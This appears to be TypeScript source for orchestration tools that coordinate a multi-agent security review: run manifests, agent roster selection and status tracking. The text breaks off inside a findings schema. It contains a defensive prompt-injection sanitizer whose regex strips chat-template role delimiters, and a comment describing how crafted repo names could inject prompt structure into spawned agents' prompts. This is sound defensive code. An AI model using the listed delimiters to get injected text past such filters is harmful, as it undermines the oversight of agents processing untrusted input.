/**
 * Orchestration MCP tools for the multi-agent security flow.
 *
 * These tools manage the lifecycle of an agent run:
 *   1. orchestration.create_agent_run     — initialise manifest
 *   2. orchestration.update_agent_status  — per-agent lifecycle updates
 *   3. orchestration.merge_agent_findings — deduplicate + sort all findings
 *   4. orchestration.ensure_skill         — lazy-download a skill from registry
 *   5. orchestration.read_agent_memory    — read per-agent memory files
 *   6. orchestration.write_agent_memory   — persist per-agent memory
 *   7. orchestration.check_updates        — check npm + skills-manifest for new versions
 *   8. orchestration.apply_updates        — run auto-update (auto | manual)
 *   9. orchestration.verify_skill_coverage — report uncovered SKILL.md sections
 */

import { createHash, randomBytes } from "node:crypto";
import * as https from "node:https";
import {
  mkdir,
  readFile,
  writeFile,
  readdir
} from "node:fs/promises";
import { existsSync, readFileSync, writeFileSync, renameSync, mkdirSync, readdirSync } from "node:fs";
import { homedir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { z } from "zod";
import { updateReviewStep } from "../review/store.js";
import { getChain, verifyChain, computeFindingsHash, computePayloadHash } from "./audit-chain.js";
import { deriveSkillSections } from "../agent-exec/agent-prompt.js";
import { INJECTION_PATTERNS } from "./injection-patterns.js";
import { enforceCapabilityFloor } from "./capability-enforcer.js";
import { sanitizeErrorMessage } from "../gate/result.js";
import { getWorkspaceRoot } from "../repo/workspace.js";
import type {
  AgentName,
  AgentRunManifest,
  AgentRecord,
  AgentStatus,
  AgentFindingsFile,
  AgentFinding,
  MergedFindings,
  SignatureVerification,
  StackContext,
  UpdateCheckResult
} from "../types/agent-run.js";
import { TERMINAL_AGENT_STATUSES } from "../types/agent-run.js";

// ---------------------------------------------------------------------------
// Constants
// ---------------------------------------------------------------------------

const AGENT_RUNS_DIR = join(".mcp", "agent-runs");
const MEMORY_DIR = join(homedir(), ".security-mcp", "agent-memory");
const SKILL_VERSIONS_PATH = join(homedir(), ".security-mcp", "skill-versions.json");
const SKILLS_MANIFEST_URL =
  "https://raw.githubusercontent.com/AbrahamOO/security-mcp/main/skills-manifest.json";
const CLAUDE_SKILLS_DIR = join(homedir(), ".claude", "skills");
// Skills ship INSIDE the npm package (package.json `files` includes "skills/").
// The installed package is the consumer's trust root, so ensure_skill prefers the
// bundled copy over any network download — this closes the trust-on-first-use gap
// where a skill's integrity hash and its content both came from the same unsigned
// remote manifest over the same channel (a MITM/compromised host could serve both).
const BUNDLED_SKILLS_DIR = resolve(dirname(fileURLToPath(import.meta.url)), "../../skills");
// CWE-494: Pin the registry URL to the canonical npm registry. Never allow
// this to be overridden by env vars — a compromised env could redirect to a
// malicious registry.
const NPM_REGISTRY_URL = "https://registry.npmjs.org/security-mcp/latest";
// Strict SemVer pattern — rejects any version string that doesn't conform.
const SEMVER_RE = /^\d{1,5}\.\d{1,5}\.\d{1,5}(?:-[\w.+]+)?$/;

// Returns true only when `candidate` is a strictly-higher release than `current`
// (major/minor/patch, ignoring pre-release tags). Used so check_updates never
// recommends installing an OLDER registry version than the one already running —
// a downgrade would re-introduce patched bugs. Non-semver inputs return false.
function isStrictlyNewer(candidate: string, current: string): boolean {
  if (!SEMVER_RE.test(candidate) || !SEMVER_RE.test(current)) return false;
  const core = (v: string) => v.split("-")[0].split(".").map((n) => Number(n));
  const [aMaj, aMin, aPat] = core(candidate);
  const [bMaj, bMin, bPat] = core(current);
  if (aMaj !== bMaj) return aMaj > bMaj;
  if (aMin !== bMin) return aMin > bMin;
  return aPat > bPat;
}

// CWE-22: input validation patterns for path components
const SAFE_SKILL_NAME_RE = /^[a-zA-Z0-9][a-zA-Z0-9._-]{0,127}$/;
const SAFE_AGENT_NAME_RE = /^[a-zA-Z0-9][a-zA-Z0-9._-]{0,127}$/;
const SAFE_AGENT_RUN_ID_RE = /^[0-9a-f]{32}$/; // hex digest produced by createAgentRun
// CWE-918: skill download URLs must be from the expected GitHub raw domain
const ALLOWED_SKILL_URL_PREFIX = "https://raw.githubusercontent.com/";
// CWE-400: cap on HTTP response bodies
const MAX_MANIFEST_BYTES = 256 * 1024;  // 256 KB
const MAX_SKILL_BYTES    = 512 * 1024;  // 512 KB
const MAX_NPM_BYTES      = 64  * 1024;  // 64 KB

// All SKILL.md sections that must be covered per run.
// §EDGE-CASE-MATRIX, §TEMPORAL-THREATS, §DETECTION-GAP, §ZERO-MISS-MANDATE are the
// four universal sections added to every skill; coverage verification tracks them too.
export const SKILL_MD_SECTIONS = [
  "§1", "§2", "§3", "§4", "§5", "§6", "§7", "§8",
  "§9", "§10", "§11", "§12", "§13", "§14", "§15",
  "§16", "§17", "§18", "§19", "§20", "§21", "§22",
  "§23", "§24",
  "§EDGE-CASE-MATRIX",
  "§TEMPORAL-THREATS",
  "§DETECTION-GAP",
  "§ZERO-MISS-MANDATE"
];

// Run-directory files that are NOT agent findings. Both mergeAgentFindings and
// verifySkillCoverage glob `*.json` out of the run directory, so without this every
// bookkeeping artifact was parsed as if it were an agent's output:
//   - attestation-chain.json was schema-rejected on every merge and pushed into
//     agentsPartial as a phantom agent named "attestation-chain";
//   - merged-findings.json was excluded from the merge but NOT from coverage, so a
//     second merge fed its own skillMdSectionsCovered back into the coverage number.
// Suffix rule covers report artifacts (compliance-report.json, pentest-report.json)
// that agents write alongside their findings.
const RESERVED_RUN_DIR_FILENAMES: ReadonlySet<string> = new Set([
  "manifest.json",
  "merged-findings.json",
  "attestation-chain.json",
  "threat-model.json",
  "coverage-manifest.json",
  "taint-map.json",
  "execution-state.json",
  "supervisor.json",
  "queue.json"
]);

export function isReservedRunDirFile(filename: string): boolean {
  return RESERVED_RUN_DIR_FILENAMES.has(filename) || /-report\.json$/.test(filename);
}

/** Candidate agent-findings files in a run directory: `*.json` minus reserved artifacts. */
function findingsCandidates(entries: string[]): string[] {
  return entries.filter((f) => f.endsWith(".json") && !isReservedRunDirFile(f));
}

// Minimum fraction of SKILL.md sections that must be covered across a run before the
// gate is allowed to PASS. Enforces that agents actually did thorough work. Overridable
// via SECURITY_MIN_SKILL_COVERAGE_PCT (0–100); defaults to 90%.
const DEFAULT_MIN_COVERAGE_PCT = 90;
function minCoveragePct(): number {
  const raw = Number(process.env.SECURITY_MIN_SKILL_COVERAGE_PCT);
  return Number.isFinite(raw) && raw >= 0 && raw <= 100 ? raw : DEFAULT_MIN_COVERAGE_PCT;
}

// Always-on Phase-1 leads that MUST report a terminal completed/completed_partial
// status for a run to be considered thorough. Stack-conditional leads (ai-llm-redteam,
// mobile-security-specialist) are only required when their surface is present, so they
// are validated dynamically from the manifest rather than hardcoded here.
const ALWAYS_ON_PHASE1_LEADS: AgentName[] = [
  "threat-modeler",
  "appsec-code-auditor",
  "cloud-infra-specialist",
  "supply-chain-devsecops",
  "crypto-pki-specialist"
];

// High-risk surfaces: a "completed" agent on one of these leads that reports zero
// findings and no explicit "no issues found" note is suspicious (WEAK_AGENT_OUTPUT).
const HIGH_RISK_LEADS: ReadonlySet<AgentName> = new Set<AgentName>([
  "appsec-code-auditor",
  "crypto-pki-specialist",
  "supply-chain-devsecops",
  "cloud-infra-specialist",
  "ai-llm-redteam",
  "pentest-team",
  "threat-modeler"
]);

// ---------------------------------------------------------------------------
// Internal helpers
// ---------------------------------------------------------------------------

async function ensureDir(p: string): Promise<void> {
  await mkdir(p, { recursive: true, mode: 0o700 });
}

// ---------------------------------------------------------------------------
// Prompt-injection hardening for stackContext (CWE-116 / OWASP LLM01)
// ---------------------------------------------------------------------------

/**
 * Sanitize a single free-text value before it can reach a spawned-agent prompt.
 *
 * stackContext arrays (languages, frameworks, aptGroups, databases, cloudProvider,
 * etc.) are derived from a project scan and are later interpolated into the prompts
 * of spawned specialist agents. An attacker who can influence those values (e.g. a
 * crafted package name or framework marker in the repo) could otherwise inject
 * prompt structure. This mirrors server.ts#sanitizePromptParam: strip Unicode
 * bidi overrides, collapse newlines, strip model-specific role delimiters and
 * HTML/XML tags and markdown structure, then hard-cap length.
 */
function sanitizePromptParam(value: string): string {
  return value
    // 1. Unicode bidirectional overrides — AML.T0051 / OWASP LLM01
    .replace(/[\u200e\u200f\u202a-\u202e\u2066-\u2069]/g, "")
    // 2. Collapse newlines
    .replace(/[\r\n\v\f\u0085\u2028\u2029]+/gu, " ")
    // 3. Model-specific injection delimiters (Llama, Mistral, tool-use XML)
    .replace(/\[INST\]|\[\/INST\]|<<SYS>>|<<\/SYS>>|<\/s>|\[s\]/gi, "")
    .replace(/<\|(?:im_start|im_end|system|user|assistant)\|>/gi, "")
    // 4. HTML/XML tags (catches <system>, <tool_use>, <function_call>, <parameter>, etc.)
    .replace(/<[^>]{0,256}>/g, "")
    // 5. Markdown structure
    .replace(/^#+\s/gm, "")
    .replace(/^-{3,}$/gm, "")
    // 6. Hard length cap
    .slice(0, 200);
}

/** Sanitize every string in a possibly-undefined string array. */
function sanitizeStringArray(arr: string[] | undefined): string[] {
  if (!Array.isArray(arr)) return [];
  return arr.map((s) => sanitizePromptParam(String(s)));
}

/**
 * Sanitize the nested string arrays of a StackContext so none of them can carry
 * prompt-injection payloads into a spawned agent's prompt. Booleans are passed
 * through unchanged. cloudProvider is re-narrowed to its literal union after
 * sanitization. Unknown extra string arrays (e.g. aptGroups) are also sanitized.
 */
export function sanitizeStackContext(ctx: StackContext): StackContext {
  const cloudProvider = sanitizeStringArray(ctx.cloudProvider as unknown as string[])
    .map((c) => (["aws", "gcp", "azure"].includes(c) ? c : "unknown")) as StackContext["cloudProvider"];

  const sanitized = {
    ...ctx,
    languages: sanitizeStringArray(ctx.languages),
    frameworks: sanitizeStringArray(ctx.frameworks),
    databases: sanitizeStringArray(ctx.databases),
    cloudProvider,
    paymentProcessor: sanitizeStringArray(ctx.paymentProcessor),
    packageManagers: sanitizeStringArray(ctx.packageManagers),
    ciPlatform: sanitizeStringArray(ctx.ciPlatform)
  } as StackContext & Record<string, unknown>;

  // Defensively sanitize any additional string[] fields not in the base type
  // (e.g. aptGroups) so future/extended stackContext keys are covered too.
  for (const [key, val] of Object.entries(sanitized)) {
    if (
      Array.isArray(val) &&
      val.every((v) => typeof v === "string") &&
      !["languages", "frameworks", "databases", "cloudProvider", "paymentProcessor", "packageManagers", "ciPlatform"].includes(key)
    ) {
      (sanitized as Record<string, unknown>)[key] = sanitizeStringArray(val as string[]);
    }
  }

  return sanitized as StackContext;
}

function agentRunDir(agentRunId: string): string {
  // CWE-22: agentRunId must be the 32-char hex digest produced by createAgentRun
  if (!SAFE_AGENT_RUN_ID_RE.test(agentRunId)) {
    throw new Error(`Invalid agentRunId "${agentRunId}"`);
  }
  return join(getWorkspaceRoot(), AGENT_RUNS_DIR, agentRunId);
}

function manifestPath(agentRunId: string): string {
  return join(agentRunDir(agentRunId), "manifest.json");
}

async function readManifest(agentRunId: string): Promise<AgentRunManifest> {
  const raw = await readFile(manifestPath(agentRunId), "utf-8");
  return JSON.parse(raw) as AgentRunManifest;
}

async function writeManifest(manifest: AgentRunManifest): Promise<void> {
  manifest.updatedAt = new Date().toISOString();
  await writeFile(manifestPath(manifest.agentRunId), JSON.stringify(manifest, null, 2) + "\n", { encoding: "utf-8", mode: 0o600 });
}

function defaultAgentRecord(): AgentRecord {
  return {
    status: "pending",
    startedAt: null,
    completedAt: null,
    findingsPath: null,
    summary: null
  };
}

/**
 * Build the initial agent registry for this run, gated on stackContext.
 *
 * Always-on agents cover the universal surfaces (code, dependencies, crypto,
 * pentest, compliance). Stack-conditional agents are only registered when the
 * relevant technology is actually detected — this avoids spawning and loading
 * skill files for surfaces that don't exist in the project.
 */
/**
 * Specialists attached to a run when the signal that makes them relevant is present.
 *
 * These personas ship in `skills/` and were previously unreachable: no roster source
 * named them, so `listBundledSkills()` counted them and no run could ever schedule one.
 * They are not deleted, because each covers a real technique the leads do not. They are
 * gated instead, because attaching fifty specialists to every run would multiply cost and
 * wall clock on repositories where most of them have nothing to examine.
 *
 * `baseline` runs everywhere: those four apply to any repository with source control and
 * instruction files, which is all of them. Every other key is a signal derived from the
 * detected stack, so a pure-backend repository never pays for the mobile or AI sets.
 *
 * Adding a persona to `skills/` without adding it here is caught by
 * `runPersonaReachabilityTests`, which fails on any persona no roster source can select.
 */
const SIGNAL_SPECIALISTS: Record<string, AgentName[]> = {
  // Applies to every repository: history, instruction files, triage, and scoring.
  baseline: [
    "agentic-instruction-auditor", "git-history-secret-scanner",
    "dread-scorer", "incident-responder"
  ],
  // Anything serving HTTP: request parsing, session handling, and abuse resistance.
  web: [
    "ssrf-detection-validator", "file-upload-attacker", "multipart-abuse-tester",
    "json-ambiguity-tester", "unicode-homograph-tester", "parser-exhaustion-tester",
    "webhook-security-tester", "bot-detection-specialist", "waf-rule-lifecycle-agent",
    "advanced-dos-tester", "dos-resilience-tester"
  ],
  // Authentication surfaces: credential handling, session lifetime, and replay.
  auth: [
    "credential-stuffing-specialist", "session-timeout-tester", "step-up-auth-enforcer",
    "token-reuse-detector", "anti-replay-tester", "oauth-pkce-specialist"
  ],
  // Cloud accounts and infrastructure as code: identity, blast radius, and egress.
  cloud: [
    "iac-security-auditor", "iam-privesc-graph-builder", "egress-policy-enforcer",
    "zero-trust-architect", "kill-switch-engineer"
  ],
  // Container and orchestration surfaces.
  container: ["container-hardening-auditor", "registry-mirror-enforcer"],
  // Build and release pipelines: provenance, delivery, and artifact trust.
  ci: [
    "slsa-level3-enforcer", "slsa-provenance-enforcer",
    "gitops-delivery-auditor", "binary-auth-validator"
  ],
  // Shipped applications: binary hardening, embedded web views, and device trust.
  mobile: [
    "mobile-binary-hardener", "mobile-webview-auditor",
    "deep-link-fuzzer", "cert-pin-rotation-specialist", "device-integrity-aggregator"
  ],
  // Model and training-data supply chain.
  ai: ["ai-model-supply-chain-agent"],
  // Data stores and anything holding personal data: masking, rotation, and key lifetime.
  data: [
    "data-platform-auditor", "linddun-privacy-analyst", "secrets-mask-bypass-tester",
    "rotation-validation-agent", "quantum-migration-planner"
  ],
  // Structured risk modelling. Extends the always-on threat-modeler lead, so it applies
  // wherever that lead does, which is everywhere.
  threatModel: ["trike-risk-modeler", "capec-code-mapper", "threat-infrastructure-analyst"],
  // Control-framework mapping. Gated rather than universal: mapping a library with no
  // deployment surface, no data, and no pipeline to CSA CCM produces findings nobody
  // acts on, and every agent scheduled is wall clock a reviewer waits through.
  compliance: [
    "csa-ccm-mapper", "csf2-governance-mapper",
    "samm-assessor", "compliance-lifecycle-tracker"
  ]
};

/** The signals a stack context raises, in the closed set SIGNAL_SPECIALISTS is keyed by. */
function signalsFor(ctx: StackContext): string[] {
  const WEB_FRAMEWORKS = ["next", "react", "vue", "svelte", "angular", "express", "fastify", "django", "rails", "spring", "flask"];
  const signals = ["baseline", "threatModel"];

  // A system with regulated data, money, hosted infrastructure, or a release pipeline is
  // one a control framework actually applies to.
  const regulated = ctx.hasPII || ctx.hasPayments
    || ctx.cloudProvider.some((p) => p !== "unknown") || ctx.ciPlatform.length > 0;
  if (regulated) signals.push("compliance");

  const hasWeb = ctx.frameworks.some((f) => WEB_FRAMEWORKS.some((w) => f.toLowerCase().includes(w)));
  if (hasWeb) signals.push("web");
  // Auth specialists are relevant wherever there is a login surface or a payment flow,
  // and payment flows always carry one.
  if (hasWeb || ctx.hasPayments) signals.push("auth");
  if (ctx.cloudProvider.some((p) => p !== "unknown")) signals.push("cloud");
  if (ctx.frameworks.some((f) => ["kubernetes", "docker", "helm"].includes(f.toLowerCase()))) signals.push("container");
  if (ctx.ciPlatform.length > 0) signals.push("ci");
  if (ctx.hasMobile) signals.push("mobile");
  if (ctx.hasAI) signals.push("ai");
  if (ctx.databases.length > 0 || ctx.hasPII) signals.push("data");

  return signals;
}

/** Every specialist whose signal the detected stack raises. */
export function specialistsFor(ctx: StackContext): AgentName[] {
  const out = new Set<AgentName>();
  for (const signal of signalsFor(ctx)) {
    for (const name of SIGNAL_SPECIALISTS[signal] ?? []) out.add(name);
  }
  return [...out];
}

/** Every persona any roster source can select, across every stack permutation. */
export function allSelectablePersonas(): AgentName[] {
  const out = new Set<AgentName>();
  for (const list of Object.values(SIGNAL_SPECIALISTS)) for (const n of list) out.add(n);
  for (const cloud of [[], ["aws"], ["gcp"], ["azure"]] as StackContext["cloudProvider"][]) {
    for (const frameworks of [[], ["kubernetes", "docker", "helm"], ["next", "express"]]) {
      for (const hasAI of [false, true]) {
        for (const hasMobile of [false, true]) {
          const ctx: StackContext = {
            languages: [], frameworks, databases: ["postgres"], cloudProvider: cloud,
            paymentProcessor: [], hasAI, hasMobile, hasPII: true, hasPayments: true,
            packageManagers: [], ciPlatform: ["github"]
          };
          for (const n of buildInitialAgentNames(ctx)) out.add(n);
        }
      }
    }
  }
  return [...out];
}

/**
 * The SKILL.md sections a given roster is capable of covering.
 *
 * Falls back to the full section list when the roster's personas cannot be read, so a
 * missing persona file shrinks nothing: an unreadable roster must not quietly become an
 * easier target than a readable one.
 */
export function coverageDenominatorFor(roster: AgentName[]): string[] {
  const seen = new Set<string>();
  for (const name of roster) {
    const body = readBundledSkillBody(name);
    if (body === null) return [...SKILL_MD_SECTIONS];
    for (const s of deriveSkillSections(body)) seen.add(s);
  }
  const denominator = SKILL_MD_SECTIONS.filter((s) => seen.has(s));
  return denominator.length > 0 ? denominator : [...SKILL_MD_SECTIONS];
}

export function buildInitialAgentNames(stackContext: StackContext): AgentName[] {
  const hasAWS   = stackContext.cloudProvider.includes("aws");
  const hasGCP   = stackContext.cloudProvider.includes("gcp");
  const hasAzure = stackContext.cloudProvider.includes("azure");
  const hasK8s   = stackContext.frameworks.includes("kubernetes") ||
                   stackContext.frameworks.includes("docker") ||
                   stackContext.frameworks.includes("helm");

  const names: AgentName[] = [
    // ── Always-on: core analysis ───────────────────────────────────────────
    "threat-modeler",
    "stride-pasta-analyst", "attack-navigator", "business-logic-attacker",
    "privacy-flow-analyst",

    "appsec-code-auditor",
    "injection-specialist", "auth-session-hacker", "logic-race-fuzzer",
    "serialization-memory-attacker",

    "supply-chain-devsecops",
    "dependency-confusion-attacker", "cicd-pipeline-hijacker", "artifact-integrity-analyst",

    "crypto-pki-specialist",
    "tls-certificate-auditor", "algorithm-implementation-reviewer",
    "key-management-lifecycle-analyst",

    // ── Always-on: cloud-infra lead (reports N/A if no cloud) ─────────────
    "cloud-infra-specialist",

    // ── Always-on: phase 2 ────────────────────────────────────────────────
    "pentest-team", "pentest-web-api", "pentest-infra", "pentest-social",
    "compliance-grc", "evidence-collector", "compliance-gap-analyst",
  ];

  // Cloud-specific penetration testers — only when that provider is detected
  if (hasAWS)   names.push("aws-penetration-tester");
  if (hasGCP)   names.push("gcp-penetration-tester");
  if (hasAzure) names.push("azure-penetration-tester");
  if (hasK8s)   names.push("k8s-container-escaper");

  // AI/LLM agents — only when AI stack is detected
  if (stackContext.hasAI) {
    names.push(
      "ai-llm-redteam",
      "prompt-injection-specialist", "model-extraction-attacker",
      "rag-poisoning-specialist", "agentic-loop-exploiter"
    );
  }

  // Mobile agents — only when mobile surfaces are detected
  if (stackContext.hasMobile) {
    names.push(
      "mobile-security-specialist",
      "ios-security-auditor", "android-penetration-tester",
      "mobile-api-network-attacker"
    );
  }

  // Signal-gated specialists. Deduplicated because a persona may be named by a lead's
  // roster above and by a signal set below.
  for (const specialist of specialistsFor(stackContext)) {
    if (!names.includes(specialist)) names.push(specialist);
  }

  return names;
}

function buildInitialAgents(stackContext: StackContext, names?: AgentName[]): Record<AgentName, AgentRecord> {
  const list = names ?? buildInitialAgentNames(stackContext);
  const record = {} as Record<AgentName, AgentRecord>;
  for (const name of list) {
    record[name] = defaultAgentRecord();
  }
  return record;
}

function readJson<T>(filePath: string, fallback: T): T {
  try {
    return JSON.parse(readFileSync(filePath, "utf-8")) as T;
  } catch {
    return fallback;
  }
}

function httpsGet(url: string, maxBytes: number, timeoutMs = 5000): Promise<string | null> {
  return new Promise((resolve) => {
    const req = https.get(url, { headers: { "User-Agent": "security-mcp" } }, (res) => {
      if ((res.statusCode ?? 500) >= 400) { res.resume(); resolve(null); return; }
      let body = "";
      res.setEncoding("utf8");
      res.on("data", (c: string) => {
        body += c;
        // CWE-400: abort if response exceeds size cap
        if (Buffer.byteLength(body, "utf8") > maxBytes) { req.destroy(); resolve(null); }
      });
      res.on("end", () => resolve(body));
    });
    req.on("error", () => resolve(null));
    req.setTimeout(timeoutMs, () => { req.destroy(); resolve(null); });
  });
}

// ---------------------------------------------------------------------------
// Tool implementations
// ---------------------------------------------------------------------------

// 1. create_agent_run
// ---------------------------------------------------------------------------

export const CreateAgentRunSchema = z.object({
  runId: z.string().uuid().describe("Review run ID from security.start_review."),
  scope: z.object({
    mode: z.enum(["recent_changes", "folder_by_folder", "file_by_file"]),
    targets: z.array(z.string()).default([]),
    baseRef: z.string().default("origin/main"),
    headRef: z.string().default("HEAD")
  }),
  internetPermitted: z.boolean().default(false).describe("Whether user permitted internet access for this run."),
  stackContext: z.object({
    languages: z.array(z.string()).default([]),
    frameworks: z.array(z.string()).default([]),
    databases: z.array(z.string()).default([]),
    cloudProvider: z.array(z.string()).default([]),
    paymentProcessor: z.array(z.string()).default([]),
    hasAI: z.boolean().default(false),
    hasMobile: z.boolean().default(false),
    hasPII: z.boolean().default(false),
    hasPayments: z.boolean().default(false),
    packageManagers: z.array(z.string()).default([]),
    ciPlatform: z.array(z.string()).default([])
  }).describe("Tech stack context derived from project scan."),
  agentNames: z.array(z.string()).optional().describe(
    "Optional pre-filtered specialist roster (security.fortify uses this for scoped runs). " +
    "Omit for the full auto-selected roster."
  )
});

export async function createAgentRun(args: z.infer<typeof CreateAgentRunSchema>): Promise<{
  agentRunId: string;
  manifestPath: string;
}> {
  const { runId, scope, internetPermitted, stackContext, agentNames } = args;
  // Use 16 bytes of CSPRNG entropy (not Date.now()) so the ID cannot be
  // predicted or brute-forced even when runId is known.
  const agentRunId = createHash("sha256")
    .update(`${runId}:`)
    .update(randomBytes(16))
    .digest("hex")
    .slice(0, 32);

  await ensureDir(agentRunDir(agentRunId));

  // Close prompt-injection via stackContext: sanitize every nested string array
  // (languages, frameworks, aptGroups, etc.) BEFORE it is persisted to the manifest
  // and BEFORE it reaches any spawned-agent prompt.
  const safeStackContext = sanitizeStackContext(stackContext as StackContext);

  // A caller-supplied roster (security.fortify's scoped runs) is intersected against
  // the real agent universe so an invalid or out-of-band name can never poison the
  // manifest — only names buildInitialAgentNames would itself produce are honored.
  // Validate an explicit roster against every EXECUTABLE agent, not against the
  // stack-gated default roster. Intersecting with buildInitialAgentNames capped the
  // reachable universe at ~39 of the ~84 named agents, so roughly 50 micro-specialists
  // (incident-responder, capec-code-mapper, dread-scorer, ...) could never enter a
  // manifest no matter what a caller asked for. The real constraint is "does a bundled
  // SKILL.md exist for it", because that persona is what actually gets executed.
  const executable = new Set(listBundledSkills());
  const filteredAgentNames = agentNames?.filter((n): n is AgentName => executable.has(n));
  const unknownAgentNames = agentNames?.filter((n) => !executable.has(n)) ?? [];
  if (unknownAgentNames.length > 0) {
    console.warn(JSON.stringify({
      event: "AGENT_ROSTER_ENTRY_IGNORED",
      timestamp: new Date().toISOString(),
      ignored: unknownAgentNames.slice(0, 20),
      reason: "no bundled SKILL.md — the agent has no persona to execute",
      severity: "LOW"
    }));
  }

  const agents = buildInitialAgents(safeStackContext, filteredAgentNames && filteredAgentNames.length > 0 ? filteredAgentNames : undefined);

  const manifest: AgentRunManifest = {
    agentRunId,
    runId,
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
    phase: 0,
    internetPermitted,
    stackContext: safeStackContext,
    scope,
    agents,
    rosterSource: filteredAgentNames && filteredAgentNames.length > 0 ? "explicit" : "auto",
    coverageDenominator: coverageDenominatorFor(Object.keys(agents) as AgentName[])
  };

  await writeManifest(manifest);

  return { agentRunId, manifestPath: manifestPath(agentRunId) };
}

// 2. update_agent_status
// ---------------------------------------------------------------------------

export const UpdateAgentStatusSchema = z.object({
  agentRunId: z.string().describe("Agent run ID from orchestration.create_agent_run."),
  // CWE-22: constrain agentName to the same safe-name pattern used in path operations
  agentName: z.string().regex(SAFE_AGENT_NAME_RE, "agentName must be alphanumeric with ._- separators").describe("Name of the agent updating its status."),
  // completed_na = "this agent's domain does not exist in this codebase", an evidenced
  // terminal verdict several skills mandate for themselves (ai-llm-redteam reports N/A
  // immediately with no AI stack). Distinct from pending: the completion gate accepts
  // completed_na and rejects pending.
  status: z.enum(["running", "completed", "completed_partial", "completed_na", "failed"]),
  // CWE-22: findingsPath is stored in the manifest and may later be used as a path — restrict to safe relative path
  // CWE-22 without forbidding legitimate paths. The previous regex required an
  // alphanumeric FIRST character, so a real path like ".mcp/agent-runs/<id>/x.json"
  // could never be stored — on-disk manifests show the leading dot silently stripped to
  // satisfy it, producing a path that resolves nowhere. Reject traversal and absolute
  // paths explicitly instead of banning a leading dot.
  findingsPath: z.string().min(1).max(256)
    .refine((p) => !p.startsWith("/") && !/^[A-Za-z]:/.test(p), "findingsPath must be relative, not absolute")
    .refine((p) => !p.split(/[\\/]/).includes(".."), "findingsPath must not contain '..' segments")
    .refine((p) => /^[A-Za-z0-9._][A-Za-z0-9._/-]*$/.test(p), "findingsPath contains unsupported characters")
    .optional().describe("Workspace-relative path to the agent findings JSON file."),
  summary: z.string().max(500).optional().describe("One-line outcome summary.")
});

export async function updateAgentStatus(args: z.infer<typeof UpdateAgentStatusSchema>): Promise<{
  manifest: AgentRunManifest;
}> {
  const { agentRunId, agentName, status, findingsPath, summary } = args;
  const manifest = await readManifest(agentRunId);
  const record = manifest.agents[agentName as AgentName];
  if (!record) {
    throw new Error(`Unknown agent: ${agentName}`);
  }

  // ── Failure escalation with retry ────────────────────────────────────────
  // On "failed": increment failureCount and, for up to MAX_AGENT_RETRIES, requeue the
  // agent as "pending" so it can be re-run (intent: at the advanced/full-power tier).
  // After retries are exhausted, mark escalationRequired so mergeAgentFindings forces
  // the gate to FAIL. Backward compatible — failureCount defaults to 0 on old records.
  const MAX_AGENT_RETRIES = 2;
  let effectiveStatus: AgentStatus = status as AgentStatus;
  if (status === "failed") {
    const prior = record.failureCount ?? 0;
    const nextCount = prior + 1;
    record.failureCount = nextCount;
    if (nextCount <= MAX_AGENT_RETRIES) {
      // Requeue for another attempt at full power.
      effectiveStatus = "pending";
      record.completedAt = null;
      console.warn(JSON.stringify({
        event: "AGENT_RETRY_TRIGGERED",
        timestamp: new Date().toISOString(),
        agentRunId,
        agentName,
        attempt: nextCount,
        maxRetries: MAX_AGENT_RETRIES,
        intent: "retry_at_advanced_tier",
        severity: "MEDIUM"
      }));
    } else {
      // Retries exhausted — escalate and force the gate to FAIL at merge time.
      record.escalationRequired = true;
      console.error(JSON.stringify({
        event: "AGENT_ESCALATION_REQUIRED",
        timestamp: new Date().toISOString(),
        agentRunId,
        agentName,
        failureCount: nextCount,
        action: "Gate will be forced to FAIL. Manual investigation required.",
        severity: "HIGH"
      }));
    }
  }

  record.status = effectiveStatus;
  if (effectiveStatus === "running") record.startedAt = new Date().toISOString();
  if (TERMINAL_AGENT_STATUSES.includes(effectiveStatus)) {
    record.completedAt = new Date().toISOString();
  }
  if (findingsPath) record.findingsPath = findingsPath;
  if (summary) record.summary = summary;

  // ── Phase advancement ────────────────────────────────────────────────────
  // A roster is frequently a SUBSET of the full agent universe (security.fortify's
  // CORE_TARGETED_TEAM is 9 agents and contains none of the phase-2 leads), so every
  // lead lookup MUST be filtered to agents actually present in this manifest first.
  // Reading `manifest.agents[n].status` unguarded threw a TypeError on the very first
  // callback for any scoped roster, which aborted before writeManifest() and silently
  // discarded the status update — the reason real runs sat at 0 completed agents.
  const phase1Leads: AgentName[] = [
    "threat-modeler", "appsec-code-auditor", "cloud-infra-specialist",
    "supply-chain-devsecops", "ai-llm-redteam", "mobile-security-specialist",
    "crypto-pki-specialist"
  ];
  const phase2Leads: AgentName[] = ["pentest-team", "compliance-grc"];

  const isTerminal = (n: AgentName): boolean => {
    const s = manifest.agents[n]?.status;
    return s !== undefined && TERMINAL_AGENT_STATUSES.includes(s);
  };
  // An EMPTY filtered list must not count as "all done" — otherwise a roster with no
  // phase-2 leads would vacuously satisfy the gate and jump straight to phase 3.
  const allDone = (leads: AgentName[]): boolean => {
    const present = leads.filter((n) => manifest.agents[n] !== undefined);
    return present.length > 0 && present.every(isTerminal);
  };

  // Phase 0 means "created, not started". Nothing previously moved a manifest out of
  // it, so the phase === 1 transition below could never fire and every run on disk was
  // stuck at phase 0. The first agent to report `running` starts phase 1.
  if (manifest.phase === 0 && effectiveStatus === "running") manifest.phase = 1;
  if (manifest.phase === 1 && allDone(phase1Leads)) manifest.phase = 2;
  if (manifest.phase === 2 && allDone(phase2Leads)) manifest.phase = 3;

  await writeManifest(manifest);
  return { manifest };
}

// 3. merge_agent_findings
// ---------------------------------------------------------------------------

// CWE-20 / inter-agent payload integrity: strict schema for an agent findings file.
// mergeAgentFindings is the single trust sink for an entire run, so every agent's
// file is schema-validated AND its findings hash is matched against that agent's
// signed attestation before any of it reaches the merged gate result.
const AgentFindingSchema = z.object({
  id: z.string().min(1).max(128),
  title: z.string().min(1).max(500),
  severity: z.enum(["LOW", "MEDIUM", "HIGH", "CRITICAL"]),
  cwe: z.string().max(64).optional(),
  attackTechnique: z.string().max(128).optional(),
  cvssV4: z.number().min(0).max(10).optional(),
  exploitChain: z.array(z.string().max(1000)).max(100).optional(),
  files: z.array(z.string().max(1024)).max(500).optional(),
  evidence: z.array(z.string().max(4000)).max(200).optional(),
  remediated: z.boolean(),
  remediationSummary: z.string().max(4000).optional(),
  requiredActions: z.array(z.string().max(2000)).max(200),
  complianceImpact: z.object({
    pciDss: z.array(z.string().max(128)).max(200).optional(),
    soc2: z.array(z.string().max(128)).max(200).optional(),
    nist80053: z.array(z.string().max(128)).max(200).optional(),
